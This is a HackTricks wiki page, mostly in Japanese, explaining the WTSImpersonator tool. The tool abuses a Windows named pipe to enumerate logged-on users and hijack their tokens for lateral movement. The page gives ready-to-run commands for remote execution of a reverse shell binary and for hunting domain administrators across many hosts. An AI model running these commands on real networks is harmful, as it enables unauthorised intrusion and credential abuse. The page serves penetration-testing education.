{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**WTS Impersonator**ツールは、**"\\pipe\LSM_API_service"** RPC Named pipeを利用して、ログインしているユーザーを密かに列挙し、トークンをハイジャックします。これにより、従来のトークン偽装技術を回避し、ネットワーク内でのシームレスな横移動が可能になります。この技術の革新は、**Omri Basoに帰属し、彼の作品は[GitHub](https://github.com/OmriBaso/WTSImpersonator)で入手可能です**。

### コア機能
このツールは、一連のAPI呼び出しを通じて動作します：
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Key Modules and Usage
- **Enumerating Users**: ローカルおよびリモートユーザーの列挙は、いずれのシナリオでもコマンドを使用してツールで可能です。
- Locally:
```powershell
.\WTSImpersonator.exe -m enum
```
- Remotely, by specifying an IP address or hostname:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Executing Commands**: `exec` および `exec-remote` モジュールは、機能するために **Service** コンテキストを必要とします。ローカル実行には、WTSImpersonator 実行可能ファイルとコマンドが必要です。
- Example for local command execution:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe を使用してサービスコンテキストを取得できます：
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Remote Command Execution**: PsExec.exe に似たリモートでサービスを作成およびインストールし、適切な権限で実行を可能にします。
- Example of remote execution:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **User Hunting Module**: 複数のマシンにわたって特定のユーザーをターゲットにし、彼らの資格情報の下でコードを実行します。これは、複数のシステムでローカル管理者権限を持つドメイン管理者をターゲットにするのに特に便利です。
- Usage example:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```


{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
